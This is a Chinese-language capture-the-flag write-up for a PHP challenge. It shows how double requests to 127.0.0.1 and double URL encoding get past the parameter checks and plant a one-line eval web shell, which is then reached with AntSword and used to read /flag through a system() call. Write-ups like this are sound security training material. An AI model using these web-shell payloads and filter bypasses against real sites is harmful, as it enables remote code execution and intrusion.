
# writeup

首先_GET不能为空, 其次path不能含有`..`做出路径穿越, 再次file必须严格匹配`http://127.0.0.1/`, 最后这题的目的是考察上传, 要把木马传上去

这题思路是通过php函数漏洞将恶意代码写入文件并上传

由于file限制较死, 所以尝试二次访问, 其中必然有一次`file=http://127.0.0.1/`, 我们把它这一次的path参数即上传木马的名称固定下来, 比如叫`hacker.php`

这一层参数为`?path=hacker.php&file=http://127.0.0.1/`

第二次访问, 就通过`?path=`写入一句话木马了, 后面再跟一个`file=http://127.0.0.1/`防止报错

总体来看就是:

`?path=hacker.php&file=http://127.0.0.1/?path=<?php eval($_POST[1]);?>&file=http://127.0.0.1/index.php`

为防出错, 对第二次的path进行编码:

`?path=hacker.php&file=http://127.0.0.1/?path=%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%3F%3E&file=http://127.0.0.1/index.php`

再对第一次的file整体载荷再编码一次:

`?path=hacker.php&file=http%3a%2f%2f127.0.0.1%2f%3fpath%3d%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%26file%3Dhttp%3a%2f%2f127.0.0.1%2findex.php`

为什么这么做? 因为解析参数的载荷时, 是优先把已经编码过的内容当作整体来解析, 于是解析完第一次后, 能满足file检查条件, 同时第二次的内容被分隔开了, 然后跳到`file=http://127.0.0.1/`去执行第二次访问, 再解析包装在path里的一句话木马

提示`console.log(upload/hacker.php update successed!)`, 已经上传了upload/hacker.php木马, 使用蚁剑连接

连上后查看目录发现有个shell.php, 内容是`console.log(upload/<?php system('cat /flag'); ?> update successed!)`

调用一下, `http://39.104.60.50:18051/upload/shell.php`得到flag

`console.log(upload/flag{dsdsdsdsdsdsdsdsdsdsdsdfvdfdfdsfdsf} update successed!)`
